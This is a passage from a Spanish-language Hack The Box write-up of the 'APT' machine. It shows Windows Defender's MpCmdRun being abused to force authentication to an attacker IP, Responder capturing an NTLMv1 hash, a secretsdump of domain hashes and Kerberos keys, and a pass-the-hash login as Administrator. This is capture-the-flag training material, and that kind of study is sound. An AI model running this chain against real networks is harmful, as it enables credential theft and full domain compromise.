<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.222<span class="se">\y</span>o
</code></pre></div></div>

<ul>
  <li>Nos llega el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>ON]
    Force ESS downgrade        <span class="o">[</span>ON]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.222]
    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...

[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
</span></code></pre></div></div>

<ul>
  <li>
    <p>Podríamos usar esta web para crackear el hash pero esta en mantenimiento <a href="https://crack.sh/get-cracking/">https://crack.sh/get-cracking/</a> y como no esta operativa no podemos crackear el hash así yo le pedí a mi compañero que en su momento hiso la maquina que me pasara el hash por que la pagina web estaba operativa cuando el la hiso.</p>
  </li>
  <li>
    <p>Con el hash podemos <code class="language-plaintext highlighter-rouge">dumpear</code> todos los hashes de los usuarios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="s1">'htb.local/APT$@apt'</span> <span class="nt">-hashes</span> :d167c3238864b12f5f82feae86a7f798
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT<span class="nv">$:</span>aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT<span class="nv">$:</span>aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT<span class="nv">$:</span>des-cbc-md5:76c45245f104a4bf
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>Ahora teniendo el hash del usuario administrador podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-wirnm</code> y obtener la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'c370bddf384a691d811ff3495e8a72e2'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
c52c0f60732da145b5ca1d4da4a65287
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry></feed>